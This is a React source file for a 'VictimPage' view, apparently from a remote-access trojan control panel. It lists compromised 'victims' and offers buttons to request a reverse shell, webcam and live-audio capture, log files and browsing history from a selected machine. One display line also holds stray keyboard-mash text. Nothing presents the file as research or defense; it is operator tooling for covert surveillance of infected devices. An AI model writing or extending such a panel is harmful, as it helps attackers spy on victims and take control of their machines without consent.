import React, { useState, useEffect } from 'react';
import { useParams, Link } from 'react-router-dom';
import { fetchVictims } from '../utils/api';
import ActionButton from './ActionButton';
import { Terminal, Camera, Mic, FileText, History } from 'lucide-react';

const buttons = [
  { label: 'Reverse shell', icon: Terminal, url: '/reverse-shell' },
  { label: 'Webcam', icon: Camera, url: '/webcam' },
  { label: 'Live audio', icon: Mic, url: '/live-audio' },
  { label: 'Log files', icon: FileText, url: '/log-files' },
  { label: 'Browsing history', icon: History, url: '/browsing-history' },
];

export default function VictimPage() {
  const { id } = useParams();
  const [victim, setVictim] = useState(null);

  useEffect(() => {
    fetchVictims().then(victims => {
      const foundVictim = victims.find(v => v.id === Number(id));
      setVictim(foundVictim || null);
    });
  }, [id]);

  if (!victim) {
    return <div>Victim not found!</div>;
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-4 sm:p-6 md:p-8">
      <h1 className="text-2xl sm:text-3xl font-bold mb-6 text-center">{victim.title}</h1>
      <div className="w-full h-96 bg-gray-800 rounded-lg shadow-md mb-6 flex items-center justify-center overflow-hidden">
        <img src={victim.image} alt={victim.title} className="w-full h-full object-cover" />
      </div>
      <p className="text-xl mb-4">Details for {victim.title}</p>
      <p className="text-lg mb-4">koiu65esrfdxgfchvjbknlm; {victim.subtitle}</p>
      
      <h2 className="text-xl font-semibold mb-4">Request data:</h2>
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4 mb-6">
        {buttons.map((button, index) => (
          <ActionButton key={index} {...button} />
        ))}
      </div>
      
      <Link to="/" className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300 ease-in-out">
        Back to Dashboard
      </Link>
    </div>
  );
}